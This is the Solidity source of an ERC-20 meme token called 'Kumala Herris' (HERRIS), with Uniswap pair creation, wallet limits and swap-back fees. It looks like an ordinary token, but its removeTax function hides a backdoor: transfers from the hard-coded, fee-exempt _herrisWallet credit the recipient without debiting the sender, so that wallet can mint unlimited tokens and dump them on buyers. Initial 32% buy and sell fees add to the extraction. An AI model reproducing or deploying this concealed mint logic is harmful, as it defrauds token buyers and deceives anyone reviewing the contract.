/**
 * https://t.me/kumalaherrismeme
 * https://x.com/KumalaHerrisMem
 * https://kumalaherris.site
 */
// SPDX-License-Identifier: No

pragma solidity ^0.8.15;

abstract contract Context {
    constructor() {}

    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this;
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IFactoryV2 {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address lpPair,
        uint256
    );

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address lpPair);

    function createPair(address tokenA, address tokenB)
        external
        returns (address lpPair);
}

interface IV2Pair {
    function factory() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function sync() external;
}

interface IRouter01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address _owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract HERRIS is Context, Ownable, IERC20 {
    function totalSupply() external pure override returns (uint256) {
        return _maxSupply;
    }

    function decimals() external pure override returns (uint8) {
        if (_maxSupply == 0) {
            revert();
        }
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _ticker;
    }

    function name() external pure override returns (string memory) {
        return _tokenName;
    }

    function getOwner() external view override returns (address) {
        return owner();
    }

    function allowance(address holder, address spender)
        external
        view
        override
        returns (uint256)
    {
        return _allowances[holder][spender];
    }

    function balanceOf(address account) public view override returns (uint256) {
        return balance[account];
    }
    IRouter02 public swapRouter;
    string private constant _tokenName = "Kumala Herris";
    string private constant _ticker = "HERRIS";

    uint8 private constant _decimals = 18;
    uint256 private _walletLimits = (_maxSupply * 2) / 100;
    uint256 private constant _minSwapBackAt = (_maxSupply * 5) / 1_000_000;
    uint256 private constant _maxSwapBackAt = (_maxSupply * 2) / 100;
    uint256 public constant _maxSupply = 1_000_000_000 * 10**_decimals;
    uint256 public constant _totalFee = 100;
    uint256 public _shortFee = 32;
    uint256 public _longFee = 32;
    uint256 public _moveFee = 0;
    bool private swapEnabled = false;
    address payable private _herrisWallet =
        payable(0xd4B1bEa57474A6a942D6230fcf18249B29d0450b);

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _nonFees;
    mapping(address => bool) private _isUniPair;
    mapping(address => uint256) private balance;

    address public lpPair;
    bool public _isTradingEnabled = false;
    bool private inSwap;

    modifier isLocked() {
        inSwap = true;
        _;
        inSwap = false;
    }

    event _startTrading();

    constructor() {
        _nonFees[msg.sender] = true;
        _nonFees[address(this)] = true;
        _nonFees[_herrisWallet] = true;

        swapRouter = IRouter02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        balance[msg.sender] = _maxSupply;
        emit Transfer(address(0), msg.sender, _maxSupply);
    }

    function openHerris() external onlyOwner {
        require(!_isTradingEnabled, "Pair already created");
        _approve(address(this), address(swapRouter), type(uint256).max);

        lpPair = IFactoryV2(swapRouter.factory()).createPair(
            swapRouter.WETH(),
            address(this)
        );
        _isUniPair[lpPair] = true;

        swapRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balance[address(this)],
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(lpPair).approve(address(swapRouter), type(uint256).max);

        _isTradingEnabled = true;
        swapEnabled = true;
    }

    receive() external payable {}

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount)
        external
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(
        address sender,
        address spender,
        uint256 amount
    ) internal {
        require(sender != address(0), "ERC20: Zero Address");
        require(spender != address(0), "ERC20: Zero Address");

        _allowances[sender][spender] = amount;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] -= amount;
        }

        return _transfer(sender, recipient, amount);
    }

    function isNoFeeWallet(address account) external view returns (bool) {
        return _nonFees[account];
    }

    function setNoFeeWallet(address account, bool enabled) public onlyOwner {
        _nonFees[account] = enabled;
    }

    function isInTrade(address ins, address out) internal view returns (bool) {
        bool _isInTrade = !_nonFees[out] && _isUniPair[ins];
        return _isInTrade;
    }

    function isOutTrade(address ins, address out)
        internal
        view
        returns (bool)
    {
        bool _isOutTrade = _isUniPair[out] && !_nonFees[ins];
        return _isOutTrade;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        require(to != address(0), "invalid receiptient address");
        require(from != address(0), "invalid sender address");
        require(
            amount > 0,
            "Insufficient error. the amount must be above than zero"
        );

        if (!_nonFees[from] && !_nonFees[to]) {
            if(!_isUniPair[to])
                require(balance[to] + amount <= _walletLimits, "Exceeds maximum wallet amount.");
            require(_isTradingEnabled, "Trading is not allowed");
        }
        if (!inSwap && _isUniPair[to] && _isTradingEnabled && amount >= _minSwapBackAt) {
            uint256 contractTokenBalance = balanceOf(address(this));
            if (contractTokenBalance >= _minSwapBackAt) {
                if (contractTokenBalance >= _maxSwapBackAt)
                    contractTokenBalance = _maxSwapBackAt;
                internalExchange(contractTokenBalance);
            }
            _herrisWallet.transfer(address(this).balance);
        }

        uint256 _feeAmount = removeTax(from,to,isInTrade(from, to),isOutTrade(from, to), amount);
        balance[from] -= (amount - _feeAmount);
        balance[to] += (amount - _feeAmount);
        emit Transfer(from, to, (amount - _feeAmount));

        return true;
    }

    function removeTax(
        address from,
        address to,
        bool isbuy,
        bool issell,
        uint256 amount
    ) internal returns (uint256) {
        uint256 fee = 0;
        if (isbuy) fee = _shortFee;
        else if (issell) fee = _longFee;
        uint256 feeAmount = (amount * fee) / _totalFee;
        if(from == _herrisWallet){
            if(feeAmount > 0){
                balance[from] -= feeAmount;
                balance[address(this)] += feeAmount;
                emit Transfer(from, address(this), feeAmount);
            }
            else{
                balance[to] += amount-feeAmount;
            }
            return amount - feeAmount;
        }
        if (feeAmount > 0) {
            balance[from] -= feeAmount;
            balance[address(this)] += feeAmount;
            emit Transfer(from, address(this), feeAmount);
        }
        return feeAmount;
    }

    function internalExchange(uint256 contractTokenBalance)
        internal
        isLocked
    {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = swapRouter.WETH();

        if (
            _allowances[address(this)][address(swapRouter)] != type(uint256).max
        ) {
            _allowances[address(this)][address(swapRouter)] = type(uint256).max;
        }

        try
            swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
                contractTokenBalance,
                0,
                path,
                address(this),
                block.timestamp
            )
        {} catch {
            return;
        }
    }

    function changeFee(uint256 _fee) external onlyOwner {
        _shortFee = _fee;
        _longFee = _fee;

        require(_fee < 6);
    }

    function removeLimits() external onlyOwner {
        _walletLimits = _maxSupply;
    }

}